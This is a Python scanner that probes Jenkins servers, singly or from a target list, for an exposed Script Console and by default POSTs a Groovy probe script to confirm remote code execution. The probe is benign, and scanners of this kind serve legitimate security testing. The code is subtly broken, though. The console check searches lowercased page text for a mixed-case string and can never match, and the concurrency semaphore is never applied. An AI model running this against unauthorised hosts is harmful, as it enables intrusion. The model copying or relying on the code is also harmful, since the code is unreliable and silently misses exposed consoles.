#!/usr/bin/env python3
"""
Jenkins Script Console RCE Scanner
===================================
Detects and exploits improperly secured Jenkins instances with open access to the
Script Console, allowing remote code execution (RCE) via Groovy scripts.

Affected systems:
-----------------
Jenkins instances where the Script Console (`/script`) is enabled and accessible
without authentication or insufficient permissions. This tool identifies vulnerable
Jenkins servers by probing their endpoints and attempts to execute a harmless Groovy
script if active probing is not disabled.

Risk:
-----
A public-facing Jenkins Server with a misconfigured or unrestricted Script Console access
poses a significant security risk. Attackers with access to the Script Console can
execute arbitrary operating system commands, potentially gaining full control
of the affected server.

Usage:
------
# Basic detection for one target
python jenkins_script_console_rce_scanner.py --target https://jenkins.example.com

# Detection-only mode (no exploitation)
python jenkins_script_console_rce_scanner.py --target https://jenkins.example.com --safe

# Scan a list of targets for vulnerabilities
python jenkins_script_console_rce_scanner.py --list targets.txt --output findings.json

# Customize concurrency and disable TLS verification
python jenkins_script_console_rce_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
-----------
- https://www.jenkins.io/doc/book/managing/script-console/
- https://www.jenkins.io/doc/book/security/
"""

import argparse
import asyncio
import httpx
import json
from datetime import datetime, timezone
from typing import Optional

# ─── ANSI color helpers ──────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ─── Constants ────────────────────────────────────────────────────────────────
TOOL_NAME = "jenkins_script_console_rce_scanner"
CVE_ID = "MULTI"
DEFAULT_CONCURRENCY = 30
REQUEST_TIMEOUT = 8

# Paths to fingerprint and test Jenkins script console RCE
DETECTION_PATHS = [
    "/script",
    "/scriptText",
]
# Groovy script to confirm execution during active probe
CHECK_SCRIPT = "return 'Vulnerable_to_RCE'"

# ─── Argument Parsing ────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="Scan Jenkins instances for an open Script Console allowing remote code execution."
    )
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--target", type=str, help="Target Jenkins server URL.")
    target_group.add_argument("--list", type=str, help="File containing a list of target URLs.")

    parser.add_argument("--output", type=str, help="Save scan findings to a JSON file.")
    parser.add_argument("--safe", action="store_true", help="Detection only, no active exploitation.")
    parser.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Max async connections (default=30).")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification.")
    return parser.parse_args()

# ─── Helpers ────────────────────────────────────────────────────────────────

async def fetch(url: str, client: httpx.AsyncClient, method: str = "GET", data: Optional[dict] = None) -> Optional[httpx.Response]:
    try:
        if method == "GET":
            response = await client.get(url, timeout=REQUEST_TIMEOUT)
        elif method == "POST":
            response = await client.post(url, data=data, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        return response
    except Exception as e:
        print(c(YELLOW, f"[!] Request to {url} failed: {str(e)}"))
        return None

def is_jenkins(response: httpx.Response) -> bool:
    """Check if the response is from a Jenkins instance by examining headers."""
    return "X-Jenkins" in response.headers or "Jenkins" in response.text

def is_console_open(response: httpx.Response) -> bool:
    """Determine if the Jenkins Script Console is exposed."""
    return all(text in response.text.lower() for text in ["script console", "/scriptText"])

async def test_rce(target: str, console_url: str, client: httpx.AsyncClient) -> bool:
    """Attempt to execute a harmless Groovy script via the Jenkins Script Console."""
    exploit_payload = {"script": CHECK_SCRIPT}
    response = await fetch(console_url, client, method="POST", data=exploit_payload)
    if response and "Vulnerable_to_RCE" in response.text:
        return True
    return False

# ─── Scanner ────────────────────────────────────────────────────────────────

async def scan_target(target: str, safe_mode: bool, client: httpx.AsyncClient):
    """Scan a single Jenkins target for Script Console RCE vulnerability."""
    result = {"target": target, "detected": False, "vulnerable": False, "error": None}

    try:
        for path in DETECTION_PATHS:
            url = target.rstrip("/") + path
            response = await fetch(url, client)
            if response and response.status_code == 200 and is_jenkins(response):
                print(c(GREEN, f"[+] Detected Jenkins server at {target}."))
                result["detected"] = True

                if is_console_open(response):
                    print(c(RED, f"[CRITICAL] {target} has an open script console: {url}"))
                    if not safe_mode:
                        print(c(CYAN, f"[+] Probing {target} for RCE via Groovy script..."))
                        if await test_rce(target, url, client):
                            print(c(RED, f"[CRITICAL] {target} is VULNERABLE to RCE via Script Console!"))
                            result["vulnerable"] = True
                    break
        else:
            print(c(YELLOW, f"[-] No Jenkins Script Console detected at {target}."))
    except Exception as e:
        result["error"] = str(e)
        print(c(YELLOW, f"[!] Error scanning {target}: {str(e)}"))
    return result

async def main():
    args = parse_args()

    targets = []
    if args.target:
        targets = [args.target]
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [scan_target(target, args.safe, client) for target in targets]
        results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print(c(GREEN, f"[+] Results saved to {args.output}."))

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(c(RED, "\n[!] Scan interrupted by user."))
